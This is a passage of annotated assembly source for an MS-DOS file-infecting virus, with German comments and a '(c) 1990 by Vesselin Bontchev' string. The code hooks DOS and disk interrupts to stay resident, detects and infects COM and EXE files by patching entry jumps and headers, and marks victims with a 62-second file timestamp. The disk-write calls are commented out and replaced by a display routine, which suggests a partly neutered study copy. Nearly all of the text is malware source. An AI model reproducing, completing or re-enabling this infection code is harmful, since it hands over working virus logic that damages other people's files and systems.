                                        ; Ofs VirInt24 + 14h
        
        ;----------------------------------------------------------
        PUSH    CS 
        CALL    InstallDevice
        ;----------------------------------------------------------

J006B2: PUSHF   
J006B3: POPF	
	POP	ES 
	POP	SI 
        ;------------------------- Re-Set Int 13h ---------------
        XOR     AX,AX
	MOV	DS,AX
        MOV     Byte Ptr CS:[SI+Offset Bontchev - Offset FirstByte],AL
        MOV     AX,Word Ptr CS:[SI+Offset INT13H+1-Offset FirstByte]
        MOV     Word Ptr DS:[13h*4  ],AX
        MOV     AX,Word Ptr CS:[SI+Offset INT13H+3-Offset FirstByte]
        MOV     Word Ptr DS:[13h*4+2],AX
        ;-------------------------------------------------------
	POP	DS 
	POP	AX 
        CMP     WORD PTR CS:[SI+Offset OldCode-Offset Firstbyte],'MZ'
	JNZ	J006DD
        JMP     JmpEXE
        ;-----------------------------------------------------        
J006DD: JMP     JmpCOM
        ;-----------------------------------------------------        
J006E0: CALL    PushAll
        MOV     AH,51h                  ; GET PSP
        INT     21H            
        SUB     DI,DI                   ; DI = 0
        MOV     AX,DI                   ; AX = 0
        DEC     BX                      ; Auf MCB des Master-programs zeigen
MCB_Loop:
        ADC     BX,AX
	MOV	DS,BX
        MOV     AX,Word Ptr DS:[DI+03h] ; MCB-Size nach AX
        CMP     BYTE Ptr DS:[DI],'Z'    ; Letzter MCB ?
        JB      MCB_Loop                ; NEIN -> MCB_Loop
        CMP     DI,Word Ptr DS:[DI+01h] ; Owner of MCB = Himself ?
        JNZ     J0075A                  ; => Command.com
        INC     BX                      ; Auf PSP zeigen
        MOV     ES,BX                   ; ES=PSP-Segment
        CMP     AX,1000h                ; MCB-Size < 1000h ?
	JB	J00708
        MOV     AX,1000h                ; Wenn MCB >= 1000h -> MCB=1000H
J00708: MOV     CL,03h
        SHL     AX,CL                   ; MCB := MCB * 8
        MOV     CX,AX                   
        REPZ    STOSW                   ; AX->ES:DI, CX mal
	JMP	SHORT J0075A
        ;------------------------------------------------------        
Virus_KEEP_Procedure: 
        ;------------------------------------------------------        
        CALL    PushAll
        ;------------------------- Get Int 21h ----------------
        MOV     CX,Offset VirInt21H -Offset FirstByte
	XOR	DI,DI
	MOV	DS,DI
        LES     DX,Dword Ptr DS:[21h*4]         ; ES:DX = Int 21h
        ;------------------------------------------------------ 
        PUSH    CS                      
	POP	DS 
        CMP     DX,CX                           ; Ist INT 21 schon von
        JNZ     J0072E                          ; mir Åbernommen ?
	MOV	AX,ES
        MOV     SI,CS                           ; dieselbe Frage
	CMP	AX,SI
	JZ	J0075A
        ;--------------------------------------------------
        ; Nein, INT21h wird z.Z. nicht von mir 'bearbeitet'
        ;--------------------------vvvvvvvvvvvvvvvvvvvvvvv
J0072E: MOV     AX,Word Ptr ES:[DI]             ; Nochmal dieselbe
        CMP     AX,CX                           ; Abfrage des INT 21h
	JNZ	J0073D
	MOV	AX,CS
        CMP     AX,Word Ptr ES:[DI+02h]
	JZ	J00742
J0073D: INC	DI 
	JNZ	J0072E
	JMP	SHORT J0074E
        ;-----------------------------------------------------        
        ;       Setzen des INT 21h auf die Virus-Prozedur
        ;-----------------------------------------------------        
J00742: MOV     SI,Offset INT21H - Offset FirstByte 
	CLD	
	MOVSW	
        MOVSW                           ; DS:SI-> ES:DI
        MOV     Word Ptr DS:[SI-04h],DX ; 994
        MOV     Word Ptr DS:[SI-02h],ES ; 996
J0074E: XOR     DI,DI
	MOV	DS,DI
        MOV     Word Ptr DS:[21h*4  ],CX
        MOV     Word Ptr DS:[21h*4+2],CS
J0075A: JMP     PopALL                         ; == RET !
        ;-----------------------------------------------------        
INFECT_File:
        PUSH    CS
	POP	DS 
	PUSH	CS 
	POP	ES 
        
        MOV     SI,Offset Buffer-Offset Firstbyte ; 880h
        MOV     DX,SI                   
        MOV     CX,0018h                ; Lese 18h byte nach DS:SI
        MOV     AH,3Fh
        INT     21H   
                   
	XOR	CX,CX
	XOR	DX,DX
        MOV     AX,4202h                ; Seek File-ENDE
        INT     21H             
        
        MOV     Word Ptr DS:[SI+1Ah],DX ; FilePointer, HiWord
        CMP     AX,0809h                ; ist File lÑnger als 2057 Byte 
	SBB	DX,+00h
        JB      J007F7                  ; und kleiner als 65536 byte ?
        
        MOV     Word Ptr DS:[SI+18h],AX ; NEIN ! 
        
        MOV     AX,'MZ'
        CMP     Word Ptr DS:[SI],AX     ; Ein EXE ?
	JZ	J00793
        CMP     WORD Ptr DS:[SI],'ZM'   ; Ein Overlay ?
	JNZ	J007AE
        
        MOV     Word Ptr DS:[SI],AX     ; ja,dann machen wir's zum EXE !
                                        ; (Depp dieser ! )
J00793: MOV     AX,Word Ptr DS:[SI+0Ch] ; Maximum Memory needed
	TEST	AX,AX
        JZ      J007F7                  ; keines ??
        MOV     AX,Word Ptr DS:[SI+08h] ; Minimum needed
        ADD     AX,Word Ptr DS:[SI+16h] ; ADD CS-Init
	CALL	J008F2
        ADD     AX,Word Ptr DS:[SI+14h] ; ADD IP-Init
	ADC	DX,+00h
	MOV	CX,DX
	XCHG	AX,DX 
	JMP	SHORT J007C0
        ;--------------------------------        
J007AE: CMP     BYTE Ptr DS:[SI],0E9H   ; Ein COM. FÑngt's mit JMP xy an ?
        JNZ     J007F8                  ; nein 
        MOV     DX,Word Ptr DS:[SI+01h] ; ja, dann ist es gaaanz leicht...
	ADD	DX,0103h
        JB      J007F8                  ; Sprung Åber 1 Segment ?
	DEC	DH
        XOR     CX,CX                   
J007C0: SUB     DX,4Dh          
        SBB     CX,00h
        MOV     AX,4200h
        INT     21H                     ; Seek INIT-Code - 4Dh
        
        ADD     AX,Offset VirusEnde-Offset FirstByte
	ADC	DX,+00h
        
        SUB     AX,Word Ptr DS:[SI+18h] ; Filesize Low-word
        SBB     DX,Word Ptr DS:[SI+1Ah] ; Filesize hi-word
        
	INC	DX 
	JNZ	J007F8
        CMP     AX,0FFF0h
	JB	J007F8
        
        ADD     SI,1Ch
	MOV	DX,SI
        MOV     CX,0809h                ; 2057h Byte lesen
        MOV     AH,3Fh
        INT     21H
        
	JB	J007F8
        CMP     CX,AX   
	JNZ	J007F8
	XOR	DI,DI
        REPZ    CMPSB                   ; BIN ICH SCHON DRINNEN ??
	JNZ	J007F8
J007F7: RETN                            ; Ja...........
        ;-----------------------------------------------------        
J007F8: MOV     SI,Offset Buffer-Offset FirstByte
	XOR	CX,CX
	XOR	DX,DX
        MOV     AX,4202h                ; seek file-ende
        INT     21H       
                               
        MOV     BYTE Ptr DS:[SI-0Ah],00h ; DOS_Version
        CMP     WORD Ptr DS:[SI    ],'MZ'
        JZ      SeekCodeStart
        ADD     AX,0A80h                ; = 2688d
	ADC	DX,+00h
	JZ	J0082F
	RETN	
        ;-----------------------------------------------------        
SeekCodeStart:
        MOV     DX,Word Ptr DS:[SI+18h]
        MOV     Byte Ptr DS:[SI-0Ah],DL
	NEG	DL
	AND	DX,+0Fh
	XOR	CX,CX
        MOV     AX,4201h
        INT     21H                     ; Seek ($ + CX:DX)
        MOV     Word Ptr DS:[SI+18h],AX
        MOV     Word Ptr DS:[SI+1Ah],DX
        ;--------------------------------------------------
        ;       Infektion erfolgt hier 
        ;--------------------------------------------------
J0082F: MOV     AX,5700h          ; Hole File-Datum/Uhrzeit
        INT     21H                 
	PUSHF	
	PUSH	CX 
	PUSH	DX 
        MOV     DI,Offset OldCode-Offset FirstByte
        
        PUSH    SI              ; Si zeigt auf 'MZ'
        MOVSB                   ; 3 byte sichern
	MOVSW	
	ADD	SI,+11h
        MOVSW                   ; 4 byte sichern
	MOVSW	
        SUB     SI,+0Ah         ;
        MOVSW                   ; nochmal 4 byte sichern
	MOVSW	

	POP	SI 
	XOR	DX,DX
        MOV     CX,Offset VirusEnde-Offset FirstByte
        ;------------------------------------------
        ;       MOV     AH,40h          ; SCHREIBE
        ;       INT     21H
        ;======( eingefÅgt )=======================
        PUSH    CX
        CALL    DISPLAYACTIVITY
        POP     AX
        ;==========================================
        ;------------------------------------------
        JB      J0086A
	XOR	CX,AX
	JNZ	J0086E
        MOV     CL,Byte Ptr DS:[SI-0Ah]
        AND     CL,0Fh
        TEST    CX,CX
        JNZ     J00863
        MOV     CL,10h
J00863: MOV     DX,0000h
        ;------------------------------------------
        ;       MOV     AH,40h                  ; SCHREIBE
        ;       INT     21H
        ;======( eingefÅgt )=======================
        PUSH    CX
        CALL    DISPLAYACTIVITY
        POP     AX
        ;==========================================
        ;------------------------------------------
J0086A: JB      SetFileAsInfected
        XOR     CX,AX
J0086E: JNZ     SetFileAsInfected
        MOV     DX,CX
        MOV     AX,4200h
        INT     21H                              ; DOS Function Call
        CMP     WORD PTR DS:[SI],'MZ'
	JZ	J0088E
        ;----------------------------( Korrektur des COM-Starts )-----
        MOV     BYTE PTR DS:[SI],0E9H
        MOV     AX,WORD PTR DS:[SI+18h]
	ADD	AX,004Ah
        MOV     WORD PTR DS:[SI+01h],AX
        MOV     CX,0003h
	JMP	SHORT J008DC
        ;----------------------------( Korrektur des EXE-Headers )----
J0088E: CALL    J008EF
	NOT	AX
	NOT	DX
	INC	AX 
	JNZ	J00899
	INC	DX 
J00899: ADD     AX,WORD Ptr DS:[SI+18h]
        ADC     DX,WORD Ptr DS:[SI+1Ah]
        MOV     CX,0010h
	DIV	CX
        MOV     WORD Ptr DS:[SI+14h],004Dh
        MOV     WORD Ptr DS:[SI+16h],AX
	ADD	AX,0083h
        MOV     WORD Ptr DS:[SI+0Eh],AX
        MOV     WORD Ptr DS:[SI+10h],0100h

        ADD     WORD Ptr DS:[SI+18h],Offset VirusEnde-Offset FirstByte
        ADC     WORD Ptr DS:[SI+1Ah],+00h

        MOV     AX,WORD Ptr DS:[SI+18h]
	AND	AX,01FFh
        MOV     WORD Ptr DS:[SI+02h],AX
	PUSHF	
        MOV     AX,WORD Ptr DS:[SI+19h]
        SHR     BYTE Ptr DS:[SI+1Bh],1
	RCR	AX,1
	POPF	
	JZ	J008D6
	INC	AX 
J008D6: MOV     WORD Ptr DS:[SI+04h],AX
        MOV     CX,0018h                        ; LÑnge des EXE-Headers
        ;
J008DC: MOV	DX,SI
        ;------------------------------------------
        ;       MOV     AH,40h                  ; SCHREIBE
        ;       INT     21H
        ;======( eingefÅgt )=======================
        CALL    DISPLAYACTIVITY
        ;==========================================
        ;------------------------------------------
SetFileAsInfected:
        POP     DX               ; Hole File-Datum/Uhrzeit vom Stack
	POP	CX 
	POPF	
	JB	J008F7
        OR      CL,1Fh           ; Set File-Uhrzeit, Sekunde auf 62 !
        MOV     AX,5701h
        INT     21H             

J008EF: MOV     AX,WORD Ptr DS:[SI+08h]
J008F2: MOV     DX,0010h
	MUL	DX
J008F7: RETN    
        ;-----------------------------------------------------
                DB      "(c) 1990"
                DB      " by Vesselin "
BontChev        DB      "Bontchev" 
                DB      00h                             
        ;-----------------------------------------------------        
VirInt13H:      CMP     AH,03h          ; Write Sektors
                JNZ     INT13H
                CMP     DL,80h          ; festplatte ??
                JNB     Int13JMP
Int13ROM_Entry: DB      0EAH
                DW      0
                DW      0       ;       JMP     0000:0000       ; 920
;-----------------------------------------------------        
Int13JMP:       DB      0EAh
                DW      0
                DW      0       ;       JMP     0000:0000       ; 925
;-----------------------------------------------------        
INT13H:         DB      0EAH
                DW      0       
                DW      0       ;       JMP     0000:0000       ; 92A
;-----------------------------------------------------        
OldCode:        INT     20      ; Terminate a COM program
                INT 3   
IP_init:        DW      0100h
CS_Init:        DW      0
SS_INIT:        DW      0
SP_INIT:        DW      0
Generation:     DW      0
;----------------------------- mehr wird nicht weggeschrieben -
Virusende:
;--------------------------------------------------------------  
                DW      ?
J0093E:         DW      ?
                DW      27 DUP (?)
DOS_Version:    DB      ?
Bontchev_Flag:  DB      ?
INT27H:         DD      ?
INT21H:         DD      ?
Buffer:         
FilePuffer:     
@Stack         EQU     $ + 80H
;--------------------------------------------------------------  
code    ENDS
        END  start
;--------------------------------------------------------------  

